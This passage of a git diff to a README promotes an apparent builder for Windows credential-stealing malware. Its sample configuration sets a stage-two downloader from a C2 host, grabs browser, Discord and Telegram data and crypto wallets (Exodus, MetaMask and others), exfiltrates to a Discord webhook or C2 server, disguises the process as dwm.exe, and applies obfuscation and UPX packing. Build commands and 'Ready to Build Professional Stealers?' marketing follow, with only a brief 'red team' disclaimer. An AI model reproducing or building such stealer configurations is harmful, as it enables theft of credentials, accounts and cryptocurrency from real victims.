+- **Environment**: Enterprise networks requiring comprehensive data gathering
+- **Users**: High-value targets with extensive digital footprints
+- **Security Level**: Advanced enterprise security with EDR/XDR
+
+</div>
+
+<div style="background-color: #1a1a1a; padding: 20px; border-radius: 10px; border-left: 4px solid #dc3545;">
+
+```json
+{
+  "downloader": {
+    "url": "https://c2.example.com/stage2.exe",
+    "savePath": "%APPDATA%\\Microsoft\\Windows\\update.exe",
+    "execParams": "--silent --background"
+  },
+  "grabber": {
+    "chrome": true,
+    "firefox": true,
+    "edge": true,
+    "brave": true,
+    "discord": true,
+    "telegram": true,
+    "wallets": ["exodus", "atomic", "electrum", "metamask"]
+  },
+  "exfiltration": {
+    "webhook": "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN",
+    "http": "https://your-c2-server.com/api/data"
+  },
+  "screenshots": {
+    "desktop": true
+  },
+  "systemInfo": {
+    "hwid": true,
+    "ip": true,
     "os": true,
     "av": true,
     "processes": true
   },
   "stealth": {
     "hideConsole": true,
-    "processName": "svchost.exe",
-    "mutex": "Global\\MyMutex",
+    "processName": "dwm.exe",
+    "mutex": "Global\\WindowsShell",
     "selfDestruct": false
   },
   "antiAnalysis": {
@@ -603,12 +1015,25 @@ Click the **"Build Executable"** button. The build process:
     "architecture": "x64",
     "obfuscate": true,
     "upx": true,
-    "icon": "path/to/custom.ico"
+    "icon": "system.ico"
   }
 }
 ```
 
-**Use Case**: Full-featured red team payload with anti-analysis and comprehensive data gathering.
+</div>
+
+<div style="background-color: #0d1a1a; padding: 15px; border-radius: 8px; border: 2px solid #17a2b8;">
+
+#### 💡 **Use Case**
+**Full-Spectrum Red Team**: Comprehensive enterprise engagement with persistent access capabilities
+
+</div>
+
+</td>
+</tr>
+</table>
+
+</div>
 
 ---
 
@@ -1208,7 +1633,101 @@ USE AT YOUR OWN RISK.
 
 <div align="center">
 
-## 🛡️ Final Reminder
+## 🎯 **Ready to Build Professional Stealers?**
+
+<div style="background-color: #0d1a0d; padding: 30px; border-radius: 20px; border: 4px solid #28a745; margin: 30px 0;">
+
+### ⚡ **Get Started Today**
+
+<div style="background-color: #0d0d0d; padding: 25px; border-radius: 15px; border: 2px solid #28a745; margin: 20px 0;">
+
+```bash
+# Clone and build in minutes
+git clone https://github.com/your-repo/stealer-gui
+cd stealer-gui
+chmod +x build.sh && ./build.sh
+./build/bin/StealerBuilder
+```
+
+</div>
+
+<div style="background-color: #0f1a0f; padding: 20px; border-radius: 10px; margin: 20px 0;">
+
+### 🚀 **What Happens Next?**
+
+<table>
+<tr>
+<td width="33%" style="text-align: center;">
+
+#### 1️⃣ **Configure**
+- Select your targets
+- Enable stealth features
+- Choose exfiltration method
+
+</td>
+<td width="33%" style="text-align: center;">
+
+#### 2️⃣ **Build**
+- One-click generation
+- Advanced obfuscation
+- Professional output
+
+</td>
+<td width="33%" style="text-align: center;">
+
+#### 3️⃣ **Deploy**
+- Windows PE executable
+- Ready for red team ops
+- Professional results
+
+</td>
+</tr>
+</table>
+
+</div>
+
+</div>
+
+<div style="background-color: #2a1a00; padding: 25px; border-radius: 15px; border: 3px solid #ffc107; margin: 30px 0;">
+
+### 🎉 **Join the Community**
+
+<div style="background-color: #0d0d0d; padding: 20px; border-radius: 10px; margin: 15px 0;">
+
+<table>
+<tr>
+<td width="50%" style="text-align: center;">
+
+#### 👥 **Connect With Us**
+- **GitHub**: Star ⭐ and contribute
+- **Issues**: Report bugs & request features
+- **Discussions**: Share knowledge & tips
+
+</td>
+<td width="50%" style="text-align: center;">
+
+#### 📚 **Learn More**
+- **Documentation**: Comprehensive guides
+- **Examples**: Real-world configurations
+- **Tutorials**: Step-by-step walkthroughs
+
+</td>
+</tr>
+</table>
+
+</div>
+
+</div>
+
+<div style="background-color: #2a0a0a; padding: 25px; border-radius: 15px; border: 3px solid #dc3545; margin: 30px 0;">
+
+### 🛡️ **Final Reminder**
+
+<div style="background-color: #0d0d0d; padding: 20px; border-radius: 10px; margin: 15px 0;">
+
+#### ⚖️ **Legal & Ethical Guidelines**
+
+<div style="background-color: #0d1a1a; padding: 15px; border-radius: 8px; border-left: 4px solid #17a2b8;">
 
 **With great power comes great responsibility.**
 
@@ -1216,7 +1735,17 @@ This tool is a double-edged sword - use it to **defend**, not attack.
 
 **Always obtain authorization. Always act ethically. Always follow the law.**
 
+</div>
+
+</div>
+
+</div>
+
 ---
+
+<div style="background-color: #1a1a2a; padding: 20px; border-radius: 15px; margin: 20px 0;">
+
+### 🏆 **Built for Professionals**
 
 *Built for red teamers, by security professionals.*
 
@@ -1224,5 +1753,4 @@ This tool is a double-edged sword - use it to **defend**, not attack.
 
 </div>
 
-
-
+</div>
